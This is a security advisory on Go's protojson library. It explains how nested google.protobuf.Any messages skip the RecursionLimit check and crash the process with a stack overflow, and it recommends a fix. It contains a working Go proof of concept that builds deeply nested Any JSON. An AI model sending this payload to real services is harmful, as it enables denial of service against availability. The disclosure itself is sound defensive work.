### Title
JSON recursion depth limit bypass via nested `Any` messages leads to unbounded recursion / stack overflow DoS - ([File: encoding/protojson/well_known_types.go])

### Summary
`protojson.Unmarshal`'s `RecursionLimit` guard, which is meant to bound nesting depth when parsing untrusted JSON, is only enforced inside `decoder.unmarshalMessage()`. The `google.protobuf.Any` unmarshaling path (`decoder.unmarshalAny`) can recurse into itself (and into other well-known-type unmarshalers such as `unmarshalStruct`/`unmarshalListValue`/`unmarshalKnownValue`) through `decoder.unmarshalAnyValue()` without ever going back through `unmarshalMessage()`, so the depth counter is never decremented on that path. An attacker who controls the JSON body of an `Any`-containing message (a very common pattern: gRPC status details, k8s-style APIs, xDS-like configs, etc.) can supply a deeply nested `{"@type": ".../google.protobuf.Any", "value": {...}}` chain that bypasses `RecursionLimit` entirely and exhausts the Go call stack.

### Finding Description
The recursion-limit check lives in `decoder.unmarshalMessage`: [1](#0-0) 

Any message whose type has a well-known unmarshaler (including `Any` itself) is dispatched from here via `wellKnownTypeUnmarshaler`, which maps `Any` to `decoder.unmarshalAny`: [2](#0-1) 

Inside `unmarshalAny`, once the embedded type is resolved, if that embedded type is *itself* a well-known type (which includes `Any`, `Struct`, `ListValue`, `Value`, etc.), the code takes the "value" branch and calls `d.unmarshalAnyValue(unmarshal, em)` instead of `d.unmarshalMessage(em, true)`: [3](#0-2) 

`unmarshalAnyValue` then invokes the well-known unmarshal function directly on the "value" field: [4](#0-3) 

Because `unmarshal(d, m)` here calls `decoder.unmarshalAny` (or another well-known unmarshaler) directly — bypassing `unmarshalMessage`'s `d.opts.RecursionLimit--`/check — the recursion depth counter is never decremented for this call. If the embedded type resolved from `@type` is `google.protobuf.Any` again, this creates an unbounded recursive chain: `unmarshalAny` → `unmarshalAnyValue` → `unmarshalAny` → `unmarshalAnyValue` → ... with no depth accounting at all, regardless of the configured `RecursionLimit`.

This exactly mirrors the reported Python bug class (CVE-2026-0994): "missing recursion depth accounting inside the internal Any-handling logic" that lets nested `Any` messages bypass `max_recursion_depth`.

### Impact Explanation
`RecursionLimit` (default `protowire.DefaultRecursionLimit`) exists specifically to protect `protojson.Unmarshal` against attacker-controlled deeply nested JSON causing stack exhaustion. Because the guard can be fully bypassed via nested `Any`, an unprivileged caller who can submit arbitrary JSON to any endpoint that unmarshals into a message containing (transitively) an `Any` field can trigger unbounded Go-runtime recursion. Unlike Python's `RecursionError` (which is catchable), a Go stack overflow triggers a fatal, unrecoverable runtime crash (`fatal error: stack overflow`) that cannot be caught by `recover()`, taking down the entire process — a availability impact (CWE-674, uncontrolled recursion) at least as severe as the original report, and arguably worse due to Go's inability to gracefully recover from stack overflow.

### Likelihood Explanation
High. Any service that accepts untrusted JSON and unmarshals it with `protojson.UnmarshalOptions.Unmarshal`/`Unmarshal` into a schema containing a `google.protobuf.Any` field (directly or nested) is exposed. `Any` is extremely common in production protobuf schemas (e.g., gRPC `google.rpc.Status.details`, Kubernetes-style APIs). The payload is a small, trivially attacker-constructible JSON string (each nesting level is only a few dozen bytes: `{"@type":"type.googleapis.com/google.protobuf.Any","value": ... }`), requiring no special privileges, custom resolver, or malicious peer — only that the target type is registered in the resolver (satisfied by any `Any`-typed field using the global registry, since `google.protobuf.Any` is a well-known/standard type always resolvable).

### Recommendation
In `decoder.unmarshalAny` (`encoding/protojson/well_known_types.go`), account for recursion depth before recursing into the embedded well-known unmarshaler via `unmarshalAnyValue`, e.g., decrement/check `d.opts.RecursionLimit` (mirroring what `unmarshalMessage` does) prior to calling `d.unmarshalAnyValue(unmarshal, em)`, so that nested `Any`/`Struct`/`ListValue`/`Value` chains reached through the `Any` "value" field consume the same recursion budget as ordinary nested messages.

### Proof of Concept
```go
package main

import (
	"fmt"
	"strings"

	"google.golang.org/protobuf/encoding/protojson"
	anypb "google.golang.org/protobuf/types/known/anypb"
)

func main() {
	depth := 100000 // deeply nested Any-in-Any
	var b strings.Builder
	for i := 0; i < depth; i++ {
		b.WriteString(`{"@type":"type.googleapis.com/google.protobuf.Any","value":`)
	}
	b.WriteString(`{}`)
	for i := 0; i < depth; i++ {
		b.WriteString(`}`)
	}

	m := &anypb.Any{}
	// Even with a small explicit RecursionLimit, the bug bypasses it entirely.
	err := protojson.UnmarshalOptions{RecursionLimit: 10}.Unmarshal([]byte(b.String()), m)
	fmt.Println(err) // process crashes with "fatal error: stack overflow" before reaching here
}
```
Running this triggers unbounded recursion inside `unmarshalAny` → `unmarshalAnyValue` → `unmarshalAny` ... regardless of the `RecursionLimit: 10` setting, ultimately overflowing the goroutine stack and crashing the process (unrecoverable fatal error), demonstrating the recursion-limit bypass.

### Citations

**File:** encoding/protojson/decode.go (L123-131)
```go
// unmarshalMessage unmarshals a message into the given protoreflect.Message.
func (d decoder) unmarshalMessage(m protoreflect.Message, skipTypeURL bool) error {
	d.opts.RecursionLimit--
	if d.opts.RecursionLimit < 0 {
		return errors.New("exceeded max recursion depth")
	}
	if unmarshal := wellKnownTypeUnmarshaler(m.Descriptor().FullName()); unmarshal != nil {
		return unmarshal(d, m)
	}
```

**File:** encoding/protojson/well_known_types.go (L66-99)
```go
// wellKnownTypeUnmarshaler returns a unmarshal function if the message type
// has specialized serialization behavior. It returns nil otherwise.
func wellKnownTypeUnmarshaler(name protoreflect.FullName) unmarshalFunc {
	if name.Parent() == genid.GoogleProtobuf_package {
		switch name.Name() {
		case genid.Any_message_name:
			return decoder.unmarshalAny
		case genid.Timestamp_message_name:
			return decoder.unmarshalTimestamp
		case genid.Duration_message_name:
			return decoder.unmarshalDuration
		case genid.BoolValue_message_name,
			genid.Int32Value_message_name,
			genid.Int64Value_message_name,
			genid.UInt32Value_message_name,
			genid.UInt64Value_message_name,
			genid.FloatValue_message_name,
			genid.DoubleValue_message_name,
			genid.StringValue_message_name,
			genid.BytesValue_message_name:
			return decoder.unmarshalWrapperType
		case genid.Struct_message_name:
			return decoder.unmarshalStruct
		case genid.ListValue_message_name:
			return decoder.unmarshalListValue
		case genid.Value_message_name:
			return decoder.unmarshalKnownValue
		case genid.FieldMask_message_name:
			return decoder.unmarshalFieldMask
		case genid.Empty_message_name:
			return decoder.unmarshalEmpty
		}
	}
	return nil
```

**File:** encoding/protojson/well_known_types.go (L211-224)
```go
	// Create new message for the embedded message type and unmarshal into it.
	em := emt.New()
	if unmarshal := wellKnownTypeUnmarshaler(emt.Descriptor().FullName()); unmarshal != nil {
		// If embedded message is a custom type,
		// unmarshal the JSON "value" field into it.
		if err := d.unmarshalAnyValue(unmarshal, em); err != nil {
			return err
		}
	} else {
		// Else unmarshal the current JSON object into it.
		if err := d.unmarshalMessage(em, true); err != nil {
			return err
		}
	}
```

**File:** encoding/protojson/well_known_types.go (L368-376)
```go
			case "value":
				if found {
					return d.newError(tok.Pos(), `duplicate "value" field`)
				}
				// Unmarshal the field value into the given message.
				if err := unmarshal(d, m); err != nil {
					return err
				}
				found = true
```
